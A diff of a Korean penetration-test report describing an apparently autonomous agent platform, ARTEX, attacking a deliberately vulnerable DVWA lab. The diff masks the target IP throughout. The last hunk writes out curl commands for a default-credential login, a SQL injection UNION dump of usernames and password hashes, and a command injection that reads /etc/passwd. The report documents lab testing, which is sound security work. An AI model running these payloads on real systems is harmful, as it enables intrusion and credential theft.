@@ -1,7 +1,7 @@
 # ARTEX 자율 침투 테스트 콘솔 — DVWA 모의해킹 테스트 보고서
 
 > 본 보고서는 **ARTEX 플랫폼의 대화(Auto Agent) 흐름을 중심으로** 테스트용 DVWA 사이트
-> (`http://100.11.22.126`)에 대한 모의해킹 과정을 정리한 것입니다. 대상 DVWA는 보안
+> (`http://100.11.*.*`)에 대한 모의해킹 과정을 정리한 것입니다. 대상 DVWA는 보안
 > 교육·검증 전용으로 구축된 의도적 취약 환경이며, 본 테스트의 1차 목적은 ARTEX의
 > **작업 생성 → 워커 실행 → 트레이스 추적 → 발견 등록** 오케스트레이션 로직 검증입니다.
 
@@ -12,7 +12,7 @@
 | 항목 | 내용 |
 |------|------|
 | 테스트 일시 | 2026-10-04 19:41 ~ 19:42 (KST) / 수동 인계 수행 10:50 ~ 10:56 (UTC) |
-| 대상 사이트 | `http://100.11.22.126` (테스트용 DVWA v1.10 *Development*) |
+| 대상 사이트 | `http://100.11.*.*` (테스트용 DVWA v1.10 *Development*) |
 | 대상 스택 | Apache/2.4.25 (Debian) · PHP · MySQL · 보안레벨 **low** |
 | 목적 | ARTEX 구동 로직·기능 검증을 위한 모의해킹 실행 및 전 과정 기록 |
 | 작업 ID | Task #1 — "DVWA 모의해킹 - ARTEX 로직/기능 테스트" |
@@ -66,7 +66,7 @@
 
 사용자는 Auto 대화 세션("테스트용 DVWA사이트 모의해킹")에 다음을 지시했다.
 
-> **http://100.11.22.126 이 사이트는 테스트용 DVWA 사이트로 ARTEX 돌아가는 로직과 기능을
+> **http://100.11.*.* 이 사이트는 테스트용 DVWA 사이트로 ARTEX 돌아가는 로직과 기능을
 > 테스트하기 위해 모의해킹을 진행하라. 작업은 녹화하고 사용하는 도구 등 기록도 잘 하라.**
 
 요청의 핵심은 ① 테스트용 DVWA 대상, ② ARTEX 구동 로직·기능 검증, ③ 작업 녹화 및
@@ -94,7 +94,7 @@
 
 ```json
 {
-  "goal": "http://100.11.22.126 DVWA 사이트에 대한 종합적인 모의해킹 수행. ARTEX 관련 로직과 기능을 중심으로 취약점 탐색, 익스플로잇, 검증을 수행하고 모든 도구 사용 내역과 과정을 기록한다.",
+  "goal": "http://100.11.*.* DVWA 사이트에 대한 종합적인 모의해킹 수행. ARTEX 관련 로직과 기능을 중심으로 취약점 탐색, 익스플로잇, 검증을 수행하고 모든 도구 사용 내역과 과정을 기록한다.",
   "seed_first_intent": true,
   "description": "DVWA 모의해킹 - ARTEX 로직/기능 테스트"
 }
@@ -193,14 +193,14 @@ Auto 대화의 수동 전수 테스트에서 **13개 모듈 전수, 12종 취약
 ```bash
 # 로그인 (CSRF 토큰 필요)
 TOKEN=$(grep -oP "user_token' value='\K[a-f0-9]+" login_page.html)
-curl -s -b c.txt -c c.txt -X POST http://100.11.22.126/login.php \
+curl -s -b c.txt -c c.txt -X POST http://100.11.*.*/login.php \
   -d "username=admin&password=password&user_token=$TOKEN&Login=Login"
 
 # SQLi UNION 덤프
-curl -s -b c.txt "http://100.11.22.126/vulnerabilities/sqli/?id=%27+UNION+SELECT+user%2Cpassword+FROM+users+--%20&Submit=Submit"
+curl -s -b c.txt "http://100.11.*.*/vulnerabilities/sqli/?id=%27+UNION+SELECT+user%2Cpassword+FROM+users+--%20&Submit=Submit"
 
 # Command Injection
-curl -s -b c.txt -X POST http://100.11.22.126/vulnerabilities/exec/ \
+curl -s -b c.txt -X POST http://100.11.*.*/vulnerabilities/exec/ \
   -d "ip=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd&Submit=Submit"
 ```
 
